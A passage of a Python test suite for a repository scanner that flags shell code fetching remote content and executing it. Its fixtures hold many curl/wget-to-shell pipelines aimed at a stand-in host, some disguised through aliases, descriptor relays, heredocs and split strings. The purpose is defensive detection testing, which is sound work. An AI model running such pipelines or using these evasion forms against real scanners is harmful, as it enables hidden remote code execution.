            "EOF\n"
            "RUN --mount=type=cache <<EOF\n"
            f"{fetcher} https://invalid.example/docker-mount | sh\n"
            "EOF\n"
            "RUN --network=none <<EOF\n"
            f"{fetcher} https://invalid.example/docker-network | sh\n"
            "EOF\n",
        )

        report = self.json_report(self.run_scanner(fixture.root))
        remote_lines = {
            finding["line"]
            for finding in report["findings"]
            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
        }
        self.assertEqual({2, 5, 8, 11, 14}, remote_lines)

    def test_req_009_yaml_escapes_and_cmd_continuations_preserve_shell_semantics(self) -> None:
        fixture = RepositoryFixture(self)
        fetcher = "cu" + "rl"
        fixture.write(
            "encoded.yml",
            f'run: "{fetcher} https://invalid.example/unicode \\u007c sh"\n'
            f'run: "{fetcher} https://invalid.example/hex \\x7c sh"\n',
        )
        fixture.write(
            "continuation.cmd",
            f"{fetcher} https://invalid.example/continued ^\n"
            "| cmd.exe\n"
            f"{fetcher} https://invalid.example/literal ^| cmd.exe\n",
        )
        fixture.write(
            "folded-paragraphs.yml",
            "run: >\n"
            f"  {fetcher} https://invalid.example/download\n"
            "\n"
            "  echo safe | sh\n"
            "run: >\n"
            f"  {fetcher} https://invalid.example/more-indented\n"
            "    | sh\n",
        )

        report = self.json_report(self.run_scanner(fixture.root))
        remote = {
            (finding["path"], finding["line"])
            for finding in report["findings"]
            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
        }
        self.assertEqual(
            {("continuation.cmd", 1), ("encoded.yml", 1), ("encoded.yml", 2)},
            remote,
        )
        unparsed = {
            (finding["path"], finding["line"])
            for finding in report["findings"]
            if finding["rule_id"] == "VW-SHELL-PIPELINE-UNPARSED"
        }
        self.assertEqual({("continuation.cmd", 3)}, unparsed)
        self.assertNotIn(
            "folded-paragraphs.yml",
            {finding["path"] for finding in report["findings"]},
        )

    def test_req_009_remote_execution_contexts_comments_interpreters_and_heredocs(self) -> None:
        fixture = RepositoryFixture(self)
        fetcher = "cu" + "rl"
        fixture.write(
            "contexts.txt",
            f"run: {fetcher} https://invalid.example/yaml | python3\n"
            f"RUN {fetcher} https://invalid.example/docker | node\n"
            f"@( {fetcher} https://invalid.example/make | perl )\n"
            f"{fetcher} https://invalid.example/comment | # continuation\n  ruby\n"
            "cat <<'DATA'\n"
            f"{fetcher} https://invalid.example/data | bash\n"
            "DATA\n"
            "bash <<'SCRIPT'\n"
            f"{fetcher} https://invalid.example/executed | php\n"
            "SCRIPT\n"
            f"{fetcher} https://invalid.example/powershell | powershell\n",
        )

        report = self.json_report(self.run_scanner(fixture.root))
        remote = [item for item in report["findings"] if item["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"]
        self.assertEqual({1, 2, 3, 4, 10, 12}, {item["line"] for item in remote})
        self.assertNotIn(7, {item["line"] for item in remote})

    def test_req_009_dynamic_contexts_sinks_and_nested_aliases_fail_closed(self) -> None:
        fixture = RepositoryFixture(self)
        fetcher = "cu" + "rl"
        fixture.write(
            "dynamic.sh",
            "RUNNER=sh\n"
            f'{fetcher} https://invalid.example/dynamic | "$RUNNER"\n'
            f"{fetcher} https://invalid.example/compound | if true; then sh; fi\n"
            f"sh -c 'FETCH={fetcher}; $FETCH https://invalid.example/nested | sh'\n",
        )
        fixture.write(
            "contexts.yml",
            f"run: FETCH={fetcher}; $FETCH https://invalid.example/yaml | sh\n"
            f"RUN FETCH={fetcher}; $FETCH https://invalid.example/docker | sh\n",
        )

        report = self.json_report(self.run_scanner(fixture.root))
        remote = {
            (item["path"], item["line"])
            for item in report["findings"]
            if item["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
        }
        unparsed = {
            (item["path"], item["line"])
            for item in report["findings"]
            if item["rule_id"] == "VW-SHELL-PIPELINE-UNPARSED"
        }
        self.assertEqual(
            {
                ("contexts.yml", 1),
                ("contexts.yml", 2),
                ("dynamic.sh", 4),
            },
            remote,
        )
        self.assertEqual({("dynamic.sh", 2), ("dynamic.sh", 3)}, unparsed)

    def test_req_009_continuations_preserve_words_and_physical_interpretations(self) -> None:
        fixture = RepositoryFixture(self)
        fetcher = "cu" + "rl"
        fixture.write(
            "continuations.txt",
            "cu\\\n"
            "rl https://invalid.example/fetch-word | sh\n"
            f"{fetcher} https://invalid.example/sink-word | s\\\n"
            "h\n"
            "echo \\\n"
            f"{fetcher} https://invalid.example/physical-posix | sh\n"
            "echo ^\n"
            f"{fetcher} https://invalid.example/physical-cmd | cmd.exe\n"
            "FETCH=\\\n"
            "curl\n"
            "$FETCH https://invalid.example/assignment | sh\n",
        )

        report = self.json_report(self.run_scanner(fixture.root))
        remote_lines = {
            item["line"]
            for item in report["findings"]
            if item["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
        }
        self.assertEqual({1, 3, 6, 8, 11}, remote_lines)

    def test_req_009_executable_substitutions_empty_heredocs_and_descriptor_flow(self) -> None:
        fixture = RepositoryFixture(self)
        fetcher = "cu" + "rl"
        fixture.write(
            "execution.sh",
            f"$({fetcher} https://invalid.example/substitution)\n"
            f"`{fetcher} https://invalid.example/backtick`\n"
            f"exec $({fetcher} https://invalid.example/exec)\n"
            f"x=$({fetcher} https://invalid.example/data)\n"
            f"echo $({fetcher} https://invalid.example/echo)\n"
            "bash <<''\n"
            f"$({fetcher} https://invalid.example/empty-delimiter)\n"
            "\n"
            "cat <<SAFE &>/dev/null | sh\n"
            f"{fetcher} https://invalid.example/redirected | sh\n"
            "SAFE\n"
            "exec 3> >(sh)\n"
            f"{fetcher} https://invalid.example/descriptor >&3\n",
        )

        report = self.json_report(self.run_scanner(fixture.root))
        remote_lines = {
            item["line"]
            for item in report["findings"]
            if item["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
        }
        self.assertEqual({1, 2, 3, 7, 13}, remote_lines)

    def test_req_009_descriptor_aliases_outputs_and_relays_are_bounded(self) -> None:
        scanner = load_scanner_module()
        fetcher = "cu" + "rl"
        descriptor_command = "ex" + "ec"
        detected_cases = {
            "named": (
                f"{descriptor_command} {{sink}}> >(sh)\n"
                f"{fetcher} https://invalid.example/x >&$sink"
            ),
            "leading-zero-and-quoted": (
                f"{descriptor_command} 03> >(sh)\n"
                f'{fetcher} https://invalid.example/x >&"03"'
            ),
            "command-wrapper": (
                f"command {descriptor_command} 3> >(sh)\n"
                f"{fetcher} https://invalid.example/x >&3"
            ),
            "implicit-and-both": (
                f"{descriptor_command} &> >(sh)\n"
                f"{fetcher} https://invalid.example/x"
            ),
            "prefix-and-trailing": (
                f"X=1 {descriptor_command} 3> >(sh) 4>/tmp/log\n"
                f"{fetcher} https://invalid.example/x >&3"
            ),
            "output-path": (
                f"{descriptor_command} {{sink}}> >(sh)\n"
                f"{fetcher} -o /dev/fd/$sink https://invalid.example/x"
            ),
            "stderr-output": (
                f"{descriptor_command} 2> >(sh)\n"
                f"{fetcher} -o /dev/stderr https://invalid.example/x"
            ),
            "descriptor-duplication": (
                f"{descriptor_command} 3> >(sh)\n"
                f"{descriptor_command} 4>&3-\n"
                f"{fetcher} https://invalid.example/x >&4"
            ),
            "pipeline-relay": (
                f"{descriptor_command} 3> >(sh)\n"
                f"{fetcher} https://invalid.example/x | tee /dev/fd/3 >/dev/null"
            ),
            "nested-relay": (
                f"{descriptor_command} 3> >(sh)\n"
                f"{fetcher} https://invalid.example/x | tee >(cat >&3)"
            ),
        }
        for name, script in detected_cases.items():
            with self.subTest(name=name):
                remote, unparsed = scanner._remote_pipe_line_numbers(script)
                self.assertTrue(remote, (name, remote, unparsed))

        ambiguous_cases = {
            "eval-side-effect": (
                f"eval '{descriptor_command} 3> >(sh)'\n"
                f"{fetcher} https://invalid.example/x >&3"
            ),
            "function-side-effect": (
                f"openfd(){{ {descriptor_command} 3> >(sh); }}\n"
                "openfd\n"
                f"{fetcher} https://invalid.example/x >&3"
            ),
            "variable-target": (
                f"{descriptor_command} 3> >(sh)\n"
                f"fd=3; {fetcher} https://invalid.example/x >&$fd"
            ),
            "dynamic-output": (
                f"{descriptor_command} 3> >(sh)\n"
                f'{fetcher} -o "$FILE" https://invalid.example/x'
            ),
        }
        for name, script in ambiguous_cases.items():
            with self.subTest(name=name):
                remote, unparsed = scanner._remote_pipe_line_numbers(script)
                self.assertTrue(remote or unparsed, (name, remote, unparsed))

        for rewire in (f"{descriptor_command} 3>/tmp/file", f"{descriptor_command} 3>&-"):
            with self.subTest(rewire=rewire):
                script = (
                    f"{descriptor_command} 3> >(sh)\n{rewire}\n"
                    f"{fetcher} https://invalid.example/x >&3"
                )
                self.assertEqual(([], []), scanner._remote_pipe_line_numbers(script))

        descriptor_flood = "\n".join(
            f"{descriptor_command} {{fd{index}}}> >(sh)" for index in range(4)
        )
        with mock.patch.object(scanner, "MAX_REMOTE_SHELL_SYMBOLS", 2):
            _remote, unparsed = scanner._remote_pipe_line_numbers(
                descriptor_flood + f"\n{fetcher} https://invalid.example/x"
            )
        self.assertTrue(unparsed)

    def test_req_009_fetch_output_groups_and_unknown_sinks_fail_closed(self) -> None:
        scanner = load_scanner_module()
        fetcher = "cu" + "rl"
        shell = "s" + "h"
        detected = (
            f"{fetcher} -o /dev/stdout https://invalid.example/a | {shell}\n"
            f"{fetcher} --output=/tmp/a https://invalid.example/b "
            f"--output=- https://invalid.example/c | {shell}\n"
            f'URL=https://invalid.example/d; {fetcher} -o /tmp/a "$URL" '
            f'--next "$URL" | {shell}\n'
            f"wget -O /proc/self/fd/1 https://invalid.example/e | {shell}\n"
        )
        remote, unparsed = scanner._remote_pipe_line_numbers(detected)
        self.assertEqual([1, 2, 3, 4], remote)
        self.assertEqual([], unparsed)

        for sink in ("awk", "sed"):
            with self.subTest(sink=sink):
                remote, unparsed = scanner._remote_pipe_line_numbers(
                    f"{fetcher} https://invalid.example/x | {sink} '{{print}}'"
                )
                self.assertEqual([], remote)
                self.assertEqual([1], unparsed)

    def test_req_009_curl_output_negations_restore_executable_stdout(self) -> None:
        scanner = load_scanner_module()
        fetcher = "cu" + "rl"
        shell = "s" + "h"
        text = (
            f"{fetcher} -O --no-remote-name https://invalid.example/a | {shell}\n"
            f"{fetcher} --remote-name-all --no-remote-name-all "
            f"https://invalid.example/b | {shell}\n"
            f"{fetcher} --remote-header-name https://invalid.example/c | {shell}\n"
        )

        self.assertEqual(([1, 2, 3], []), scanner._remote_pipe_line_numbers(text))

    def test_req_009_nonbrace_multiline_compounds_and_functions_block(self) -> None:
        scanner = load_scanner_module()
        fetcher = "cu" + "rl"
        cases = {
            "timed-brace": f"time {{\n {fetcher} https://invalid.example/a\n}} | sh\n",
            "negated-subshell": f"! (\n {fetcher} https://invalid.example/b\n) | sh\n",
            "subshell-function": (
                f"fetch() (\n {fetcher} https://invalid.example/c\n)\nfetch | sh\n"
            ),
            "conditional-function": (
                f"fetch() if true; then\n {fetcher} https://invalid.example/d\n"
                "fi\nfetch | sh\n"
            ),
        }

        for name, text in cases.items():
            with self.subTest(name=name):
                remote, unparsed = scanner._remote_pipe_line_numbers(text)
                self.assertTrue(remote or unparsed, (name, remote, unparsed))

    def test_req_009_state_mutations_respect_local_and_uncertain_scopes(self) -> None:
        scanner = load_scanner_module()
        fetcher = "cu" + "rl"
        local_only = (
            "FETCH=printf\n"
            f"set_local(){{ local FETCH; FETCH={fetcher}; }}\n"
            "set_local\n"
            "$FETCH https://invalid.example/local | sh\n"
        )
        local_remote, local_unparsed = scanner._remote_pipe_line_numbers(local_only)
        self.assertEqual([], local_remote)
        self.assertEqual([4], local_unparsed)

        uncertain = {
            "background-unset": (
                f"fetch(){{ {fetcher} https://invalid.example/background; }}\n"
                "unset -f fetch &\nfetch | sh\n"
            ),
            "false-and-unset": (
                f"fetch(){{ {fetcher} https://invalid.example/and; }}\n"
                "false && unset -f fetch\nfetch | sh\n"
            ),
            "true-or-unset": (
                f"fetch(){{ {fetcher} https://invalid.example/or; }}\n"
                "true || unset -f fetch\nfetch | sh\n"
            ),
        }
        for name, text in uncertain.items():
            with self.subTest(name=name):
                remote, unparsed = scanner._remote_pipe_line_numbers(text)
                self.assertTrue(remote or unparsed, (name, remote, unparsed))

    def test_req_009_real_shell_aliases_are_tracked_and_can_be_removed(self) -> None:
        scanner = load_scanner_module()
        fetcher = "cu" + "rl"
        remote, unparsed = scanner._remote_pipe_line_numbers(
            "shopt -s expand_aliases\n"
            f"alias fetch='{fetcher} -fsSL'\n"
            "fetch https://invalid.example/alias | sh\n"
        )
        self.assertEqual([3], remote)
        self.assertEqual([], unparsed)

        removed = (
            f"alias fetch={fetcher}\n"
            "unalias fetch\n"
            "fetch https://invalid.example/removed | sh\n"
        )
        self.assertEqual(([], []), scanner._remote_pipe_line_numbers(removed))

    def test_req_009_literal_remote_files_cannot_be_executed_later(self) -> None:
        scanner = load_scanner_module()
        fetcher = "cu" + "rl"
        rule = scanner.RULES["VW-REMOTE-INSTALL-SCRIPT"]
        self.assertEqual("Execution of remotely fetched content", rule.title)
        self.assertIn("through a pipeline", rule.message)
        self.assertIn("local file", rule.message)
        unparsed_rule = scanner.RULES["VW-SHELL-PIPELINE-UNPARSED"]
        self.assertEqual(
            "Relevant shell flow not safely classified",
            unparsed_rule.title,
        )
        self.assertIn("fetch-to-execution flow", unparsed_rule.message)
        self.assertEqual(
            scanner._literal_remote_file_path("install.sh"),
            scanner._literal_remote_file_path("./build/../install.sh"),
        )
        script = (
            f"{fetcher} -o /tmp/vibeworthy-a https://invalid.example/a\n"
            "sh /tmp/vibeworthy-a\n"
            f"{fetcher} https://invalid.example/b > ./vibeworthy-b\n"
            "bash ./vibeworthy-b\n"
            "wget https://invalid.example/c -O /tmp/vibeworthy-c\n"
            "chmod +x /tmp/vibeworthy-c\n"
            "/tmp/vibeworthy-c\n"
        )

        self.assertEqual(
            ([2, 4, 7], []),
            scanner._remote_pipe_line_numbers(script),
        )

        safe = (
            f"{fetcher} -o /tmp/vibeworthy-safe https://invalid.example/safe\n"
            "sh /tmp/unrelated\n"
        )
        self.assertEqual(([], []), scanner._remote_pipe_line_numbers(safe))

        same_line = (
            f"{fetcher} -o install.sh https://invalid.example/same-line; "
            "sh ./install.sh\n"
        )
        self.assertEqual(([1], []), scanner._remote_pipe_line_numbers(same_line))

        conditional = (
            "wget https://invalid.example/conditional -O install.sh && "
            "chmod +x install.sh && ./install.sh\n"
        )
        conditional_remote, conditional_unparsed = (
            scanner._remote_pipe_line_numbers(conditional)
        )
        self.assertTrue(conditional_remote or conditional_unparsed)

    def test_req_009_dynamic_fetch_destinations_fail_closed_across_lines(self) -> None:
        scanner = load_scanner_module()
        fetcher = "cu" + "rl"
        cases = {
            "curl-option": (
                f'p=install.sh\n{fetcher} -o "$p" https://invalid.example/a\n'
                'sh "$p"\n'
            ),
            "wget-option": (
                'p=install.sh\nwget https://invalid.example/b -O "$p"\n'
                'bash "$p"\n'
            ),
            "stdout-redirection": (
                f'p=install.sh\n{fetcher} https://invalid.example/c > "$p"\n'
                'sh "$p"\n'
            ),
        }
        for name, text in cases.items():
            with self.subTest(name=name):
                remote, unparsed = scanner._remote_pipe_line_numbers(text)
                self.assertEqual([], remote)
                self.assertEqual([3], unparsed)

        same_line = (
            f'p=install.sh; {fetcher} -o "$p" https://invalid.example/d; '
            'sh "$p"\n'
        )
        self.assertEqual(([], [1]), scanner._remote_pipe_line_numbers(same_line))

        unrelated = (
            f"{fetcher} -o fetched.sh https://invalid.example/safe\n"
            "sh reviewed.sh\n"
        )
        self.assertEqual(([], []), scanner._remote_pipe_line_numbers(unrelated))

        download_only = (
            f'p=download.bin\n{fetcher} -o "$p" https://invalid.example/inspect\n'
            'file "$p"\n'
        )
        self.assertEqual(([], []), scanner._remote_pipe_line_numbers(download_only))

    def test_req_009_chained_and_wrapped_shell_aliases_are_bounded(self) -> None:
        scanner = load_scanner_module()
        fetcher = "cu" + "rl"
        multiline = (
            "alias a=b\n"
            f"alias b={fetcher}\n"
            "a https://invalid.example/multiline | sh\n"
        )
        self.assertEqual(
            ([3], []),
            scanner._remote_pipe_line_numbers(multiline),
        )

        cases = {
            "chain": f"alias a=b; alias b={fetcher}; a https://invalid.example/a | sh\n",
            "command-wrapper": (
                f"command alias a={fetcher}; a https://invalid.example/b | sh\n"
            ),
            "builtin-wrapper": (
                f"builtin alias a={fetcher}; a https://invalid.example/c | sh\n"
            ),
            "options-to-file": (
                f"alias get='{fetcher} -o fetched.sh'\n"
                "get https://invalid.example/d\nsh fetched.sh\n"
            ),
        }
        for name, text in cases.items():
            with self.subTest(name=name):
                remote, unparsed = scanner._remote_pipe_line_numbers(text)
                self.assertTrue(remote or unparsed, (name, remote, unparsed))

        benign = (
            "alias a=b\nalias b=printf\n"
            "a harmless >/dev/null\n"
        )
        self.assertEqual(([], []), scanner._remote_pipe_line_numbers(benign))

        removed = (
            "alias a=b\n"
            f"alias b={fetcher}\n"
            "unalias a\n"
            "a https://invalid.example/removed-chain | sh\n"
        )
        self.assertEqual(([], []), scanner._remote_pipe_line_numbers(removed))

        alias_flood = "; ".join(
            f"alias a{index}=a{index + 1}" for index in range(4)
        ) + f"; alias a4={fetcher}; a0 https://invalid.example/budget | sh"
        with mock.patch.object(scanner, "MAX_REMOTE_SHELL_SYMBOLS", 3):
            remote, unparsed = scanner._remote_pipe_line_numbers(alias_flood)
        self.assertTrue(remote or unparsed)

        multiline_flood = "\n".join(
            [
                "alias a0=a1",
                "alias a1=a2",
                "alias a2=a3",
                "alias a3=a4",
                f"alias a4={fetcher}",
                "a0 https://invalid.example/multiline-budget | sh",
            ]
        )
        with mock.patch.object(scanner, "MAX_REMOTE_SHELL_SYMBOLS", 3):
            remote, unparsed = scanner._remote_pipe_line_numbers(multiline_flood)
        self.assertTrue(remote or unparsed)

    def test_req_009_forward_functions_and_file_effects_never_scan_clean(self) -> None:
        scanner = load_scanner_module()
        fetcher = "cu" + "rl"
        forward = (
            "a(){ b; }\n"
            f"b(){{ {fetcher} https://invalid.example/forward; }}\n"
            "a | sh\n"
        )
        remote, unparsed = scanner._remote_pipe_line_numbers(forward)
        self.assertTrue(remote or unparsed)

        file_effect = (
            f"download(){{ {fetcher} -o fetched.sh https://invalid.example/file; }}\n"
            "download\nsh fetched.sh\n"
        )
        remote, unparsed = scanner._remote_pipe_line_numbers(file_effect)
        self.assertTrue(remote or unparsed)

        same_line = (
            f"download(){{ {fetcher} -o fetched.sh https://invalid.example/inline; }}; "
            "download; sh fetched.sh\n"
        )
        remote, unparsed = scanner._remote_pipe_line_numbers(same_line)
        self.assertTrue(remote or unparsed)

        case_flow = (
            "case x in\n"
            f"  x) {fetcher} -o fetched.sh https://invalid.example/case ;;\n"
            "esac\nsh fetched.sh\n"
        )
        remote, unparsed = scanner._remote_pipe_line_numbers(case_flow)
        self.assertTrue(remote or unparsed)

    def test_req_009_native_files_consumers_and_transforms_are_closed(self) -> None:
        scanner = load_scanner_module()
        fetcher = "cu" + "rl"
        cases = {
            "curl-native": (
                f"{fetcher} -O https://invalid.example/native.sh\nsh native.sh\n"
            ),
            "curl-remote-name": (
                f"{fetcher} --remote-name https://invalid.example/name.sh\n"
                "sh name.sh\n"
            ),
            "wget-native": "wget https://invalid.example/wget.sh\nsh wget.sh\n",
            "wget-combined": "wget -qOfetched.sh https://invalid.example/wget\nsh fetched.sh\n",
            "stdin": (
                f"{fetcher} -o fetched.sh https://invalid.example/stdin\n"
                "sh < fetched.sh\n"
            ),
            "source-stdin": (
                f"{fetcher} -o fetched.sh https://invalid.example/source\n"
                ". < fetched.sh\n"
            ),
            "cat-pipeline": (
                f"{fetcher} -o fetched.sh https://invalid.example/cat\n"
                "cat fetched.sh | sh\n"
            ),
            "eval-cat": (
                f"{fetcher} -o fetched.sh https://invalid.example/eval\n"
                'eval "$(cat fetched.sh)"\n'
            ),
            "tee-output": (
                f"{fetcher} https://invalid.example/tee | tee fetched.sh >/dev/null\n"
                "sh fetched.sh\n"
            ),
            "substitution-output": (
                f'printf %s "$({fetcher} https://invalid.example/sub)" > fetched.sh\n'
                "sh fetched.sh\n"
            ),
            "heredoc-output": (
                "sh <<'SCRIPT' > fetched.sh\n"
                f"{fetcher} https://invalid.example/heredoc\n"
                "SCRIPT\nsh fetched.sh\n"
            ),
        }
        for name, text in cases.items():
            with self.subTest(name=name):
                remote, unparsed = scanner._remote_pipe_line_numbers(text)
                self.assertTrue(remote or unparsed, (name, remote, unparsed))

        for transform in ("mv", "cp", "install", "ln"):
            with self.subTest(transform=transform):
                text = (
                    f"{fetcher} -o fetched.sh https://invalid.example/transform\n"
                    f"{transform} fetched.sh moved.sh\n"
                    "echo safe\n"
                )
                remote, unparsed = scanner._remote_pipe_line_numbers(text)
                self.assertEqual([], remote)
                self.assertIn(2, unparsed)

        unrelated_transform = (
            f"{fetcher} -o fetched.sh https://invalid.example/unrelated\n"
            "cp reviewed.sh moved.sh\n"
        )
        self.assertEqual(([], []), scanner._remote_pipe_line_numbers(unrelated_transform))

    def test_req_009_exec_redirections_apply_in_order_and_named_fds_invalidate(self) -> None:
        scanner = load_scanner_module()
        fetcher = "cu" + "rl"
        detected = {
            "duplicate": (
                "exec 3> >(sh) 4>&3\n"
                f"{fetcher} https://invalid.example/duplicate >&4\n"
            ),
            "move": (
                "exec 3> >(sh) 4>&3-\n"
                f"{fetcher} https://invalid.example/move >&4\n"
            ),
            "stdout": (
                "exec 3> >(sh) 1>&3\n"
                f"{fetcher} https://invalid.example/stdout\n"
            ),
            "stderr": (
                "exec 3> >(sh) 2>&3\n"
                f"{fetcher} -o /dev/stderr https://invalid.example/stderr\n"
            ),
        }
        for name, text in detected.items():
            with self.subTest(name=name):
                remote, unparsed = scanner._remote_pipe_line_numbers(text)
                self.assertTrue(remote, (name, remote, unparsed))

        safe = (
            "exec 3> >(sh) 3>/tmp/synthetic\n"
            f"{fetcher} https://invalid.example/rewired >&3\n"
            "exec {sink}> >(sh)\n"
            "sink=9\n"
            f"{fetcher} https://invalid.example/reassigned >&$sink\n"
        )
        self.assertEqual(([], []), scanner._remote_pipe_line_numbers(safe))

    def test_req_009_literal_heredoc_output_becomes_code_at_consumers(self) -> None:
        scanner = load_scanner_module()
        fetcher = "cu" + "rl"
        cases = {
            "group": (
                "{\n cat <<'SCRIPT'\n"
                f" {fetcher} https://invalid.example/group | sh\n"
                "SCRIPT\n} | sh\n"
            ),
            "function": (
                "emit(){\n cat <<'SCRIPT'\n"
                f" {fetcher} https://invalid.example/function | sh\n"
                "SCRIPT\n}\nemit | sh\n"
            ),
        }
        for name, text in cases.items():
            with self.subTest(name=name):
                remote, unparsed = scanner._remote_pipe_line_numbers(text)
                self.assertTrue(remote or unparsed, (name, remote, unparsed))

        data_only = (
            "cat <<'SCRIPT'\n"
            f"{fetcher} https://invalid.example/data | sh\n"
            "SCRIPT\n"
        )
        self.assertEqual(([], []), scanner._remote_pipe_line_numbers(data_only))

    def test_req_009_multiline_balance_is_shell_scoped_and_precise(self) -> None:
        scanner = load_scanner_module()
        fetcher = "cu" + "rl"
        text = (
            f"{fetcher} -o /tmp/x https://invalid.example/a | grep if\n"
            f"{fetcher} https://invalid.example/b | sh\n"
            f"if true; then\n  {fetcher} https://invalid.example/c\nfi | sh\n"
        )
        self.assertEqual(([2, 3], []), scanner._remote_pipe_line_numbers(text))

        python_source = (
            "if loader is None:\n"
            "    raise RuntimeError()\n"
            "for rule in (\n"
            "    values\n"
            "):\n"
            'literal = {"$(", ">(\", "if"}\n'
        )
        self.assertEqual(
            ([], []),
            scanner._remote_pipe_line_numbers(
                python_source,
                structural_multiline=False,
            ),
        )

        fixture = RepositoryFixture(self)
        fixture.write(
            "install.js",
            "#!/usr/bin/env bash\n"
            "fetch()\n{\n"
            f"  {fetcher} https://invalid.example/shebang\n"
            "}\nfetch | sh\n",
        )
        report = self.json_report(self.run_scanner(fixture.root))
        remote = [
            item
            for item in report["findings"]
            if item["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
        ]
        self.assertEqual([6], [item["line"] for item in remote])

    def test_req_009_function_scopes_alias_forms_and_stdout_are_precise(self) -> None:
        fixture = RepositoryFixture(self)
        fetcher = "cu" + "rl"
        fixture.write(
            "functions.sh",
            "fetch()\n"
            "{\n"
            f"  {fetcher} https://invalid.example/function\n"
            "}\n"
            "fetch | sh\n"
            f"FETCH=c''url\n"
            "$FETCH https://invalid.example/concatenated | sh\n"
            f"A=x FETCH={fetcher}\n"
            "$FETCH https://invalid.example/multiple | sh\n"
            f"export A=x FETCH={fetcher}\n"
            "$FETCH https://invalid.example/exported | sh\n"
            f"declare -x FETCH={fetcher}\n"
            "$FETCH https://invalid.example/declared | sh\n"
            f"{{ FETCH={fetcher}; $FETCH https://invalid.example/braces | sh; }}\n"
            f"if true; then FETCH={fetcher}; $FETCH https://invalid.example/if | sh; fi\n"
            f"( FETCH={fetcher}; $FETCH https://invalid.example/subshell | sh )\n",
        )
        fixture.write(
            "safe-functions.sh",
            f"FETCH={fetcher}\n"
            "safe(){ FETCH=printf; $FETCH ignored; }\n"
            "safe | sh\n"
            f"redirected(){{ {fetcher} https://invalid.example/redirected; }} >/dev/null\n"
            "redirected | sh\n",
        )

        report = self.json_report(self.run_scanner(fixture.root))
        remote = {
            (item["path"], item["line"])
            for item in report["findings"]
            if item["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
        }
        self.assertEqual(
            {
                ("functions.sh", 5),
                ("functions.sh", 7),
                ("functions.sh", 9),
                ("functions.sh", 11),
                ("functions.sh", 13),
                ("functions.sh", 14),
                ("functions.sh", 15),
                ("functions.sh", 16),
            },
            remote,
        )
        self.assertNotIn("safe-functions.sh", {item["path"] for item in report["findings"]})

    def test_req_009_function_and_heredoc_budgets_are_linear_and_fail_closed(self) -> None:
        scanner = load_scanner_module()
        function_text = "f(){\n" + ("echo safe\n" * 12_000) + "}\nf | sh\n"
        started = time.perf_counter()
        self.assertEqual(([], []), scanner._remote_pipe_line_numbers(function_text))
        function_elapsed = time.perf_counter() - started
        self.assertLess(function_elapsed, 1.5, f"pending function scan took {function_elapsed:.3f}s")

        fetcher = "cu" + "rl"
        heredoc_text = "bash <<A <<B <<C\n" + f"$({fetcher} https://invalid.example/tool)\n"
        with mock.patch.object(scanner, "MAX_HEREDOC_SPECS", 2):
            self.assertEqual(([], [1]), scanner._remote_pipe_line_numbers(heredoc_text))

        heredoc_group = (
            "sh "
            + " ".join(f"0<<D{index}" for index in range(64))
            + "\n"
            + "".join(f":\nD{index}\n" for index in range(64))
        )
        repeated_heredocs = "# curl | sh\n" + heredoc_group * 128
        started = time.perf_counter()
        self.assertEqual(
            ([], []),
            scanner._remote_pipe_line_numbers(repeated_heredocs),
        )
        heredoc_elapsed = time.perf_counter() - started
        self.assertLess(
            heredoc_elapsed,
            1.0,
            f"repeated heredoc scan took {heredoc_elapsed:.3f}s",
        )

    def test_req_009_independent_lines_do_not_form_remote_pipeline(self) -> None:
        fixture = RepositoryFixture(self)
        fetcher = "cu" + "rl"
        shell = "ba" + "sh"
        fixture.write(
            "download.sh",
            f"{fetcher} -o tool https://invalid.example/tool\n"
            f"printf safe | {shell}\n"
            f"{fetcher} is only a word in this prose.\n"
            f"echo local | {shell}\n"
            f"{fetcher} https://invalid.example/literal-single '|' {shell}\n"
            f'{fetcher} https://invalid.example/literal-double "|" {shell}\n'
            f"{fetcher} https://invalid.example/literal-escaped \\| {shell}\n",
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(0, completed.returncode)
        self.assertNotIn(
            "VW-REMOTE-INSTALL-SCRIPT",
            {finding["rule_id"] for finding in report["findings"]},
        )

    def test_req_009_shell_tokenization_is_linear_and_malformed_syntax_fails_closed(self) -> None:
        fixture = RepositoryFixture(self)
        fetcher = "cu" + "rl"
        shell = "ba" + "sh"
        fixture.write("long-unclosed.txt", f'{fetcher} "' + ("x" * 50_000) + "\n")
        fixture.write(
            "long-pipeline.txt",
            f"{fetcher} " + ("x" * 5_000) + f" | {shell}\n",
        )
        fixture.write("malformed-pipeline.txt", f'{fetcher} "unclosed | {shell}\n')

        started = time.perf_counter()
        completed = self.run_scanner(fixture.root)
        elapsed = time.perf_counter() - started
        report = self.json_report(completed)

        self.assertLess(elapsed, 3.0, f"bounded shell scan took {elapsed:.3f}s")
        self.assertEqual(1, completed.returncode)
        unparsed = [
            finding
            for finding in report["findings"]
            if finding["rule_id"] == "VW-SHELL-PIPELINE-UNPARSED"
        ]
        self.assertEqual({"malformed-pipeline.txt"}, {finding["path"] for finding in unparsed})
        remote = [
            finding
            for finding in report["findings"]
            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
        ]
        self.assertEqual({"long-pipeline.txt"}, {finding["path"] for finding in remote})

    def test_req_009_plain_megabyte_scan_is_linear(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write("plain.txt", "!" * 1_048_576)

        scanner = load_scanner_module()
        started = time.perf_counter()
        self.assertEqual(([], []), scanner._remote_pipe_line_numbers("!" * 1_048_576))
        direct_elapsed = time.perf_counter() - started

        pipe_only = ("left|right;" * 100_000)[:1_048_576]
        started = time.perf_counter()
        self.assertEqual(([], []), scanner._remote_pipe_line_numbers(pipe_only))
        pipe_elapsed = time.perf_counter() - started
        self.assertEqual(([], []), scanner._remote_pipe_line_numbers('left | "unterminated'))
        self.assertEqual(([], [1]), scanner._remote_pipe_line_numbers("curl https://invalid.example |"))

        remote_command_flood = "curl https://invalid.example; " + ("echo x | cat; " * 70_000)
        started = time.perf_counter()
        self.assertEqual(([], [1]), scanner._remote_pipe_line_numbers(remote_command_flood))
        command_flood_elapsed = time.perf_counter() - started

        started = time.perf_counter()
        completed = self.run_scanner(fixture.root)
        scan_elapsed = time.perf_counter() - started

